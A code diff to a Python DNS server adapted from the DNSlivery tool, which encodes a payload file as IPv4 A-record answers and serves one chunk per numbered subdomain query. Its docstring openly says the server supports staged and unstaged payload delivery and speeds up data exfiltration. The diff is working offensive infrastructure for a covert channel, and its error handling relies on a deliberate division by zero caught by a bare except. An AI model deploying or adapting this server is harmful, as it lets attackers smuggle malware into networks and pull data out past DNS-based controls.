@@ -1,7 +1,13 @@
 #! /usr/bin/env python3
 
-#original source: https://github.com/no0be/DNSlivery
+''' 
+original source: https://github.com/no0be/DNSlivery
+axed to chunk by default payload.txt to ipv4 addresses, e.g. AAAA is translated to 65.65.65.65
+the command is padded with spaces so as its lenght is congruent to 4 and the final chunk is indicated by the 4.4.4.4
 
+the digits in the suffix of the first label indicates the chunk that will be delivered e.g. test1.doma.in will deliver the first chunk (1-index based)
+all other requests will return 8.8.8.8 (can be used to speed up the data exfiltration in both staged and unstaged versions)
+'''
 import sys
 import os
 import argparse
@@ -65,23 +71,23 @@ def dns_handler(data):
 
         # only process a queries (type 1)
         if len(dnsqr.qname) != 0 and dnsqr.qtype == 1:
-            if args.verbose: log('Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src))
+        
+            try:
+                if args.verbose: log('Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src))
 
-            # remove domain part of fqdn and split the different parts of hostname
-            hostname = re.sub('\.%s\.?$' % args.domain, '', dnsqr.qname.decode()).split('.')
-            if not hostname: return
-            
-            index_match = re.findall(r'\d+$', hostname[0])
-            if not index_match: return
-            index = int(index_match[0])
-            
-            
-            if index <= len(chunks):
-                response = chunks[index-1]
-                log('Delivering payload chunk %s/%d (%s)' % (index, len(chunks), response), '+')
+                # remove domain part of fqdn and split the different parts of hostname
+                hostname = re.sub('\.%s\.?$' % args.domain, '', dnsqr.qname.decode()).split('.')
+                
+                index_match = re.findall(r'\d+$', hostname[0])
+                index = int(index_match[0])
+                
+                if 0<index<=len(chunks):
+                    response = chunks[index-1]
+                    log('Delivering payload chunk %s/%d (%s)' % (index, len(chunks), response), '+')
 
-            else: return
-
+                else: 0/0
+            except:
+                response = "8.8.8.8"
             # build response packet
             rdata = response
             rcode = 0
